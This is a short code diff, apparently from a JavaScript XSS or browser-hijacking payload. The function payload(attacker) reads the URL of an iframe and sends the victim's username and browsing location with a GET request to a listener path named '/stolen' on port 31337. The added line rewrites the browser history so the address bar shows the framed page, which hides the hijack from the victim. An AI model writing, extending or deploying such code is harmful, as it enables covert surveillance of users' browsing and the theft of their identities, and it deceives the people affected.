@@ -52,6 +52,7 @@ function payload(attacker) {
 		queryURL = $("#ifr").contents().get(0).location.href;
 		queryDial = "http://127.0.0.1:31337/stolen?event=nav&user="+queryUsername+"&url="+queryURL;
 		$.get(queryDial);
+		window.history.replaceState(null, null, queryURL)
   })
   ;
 }
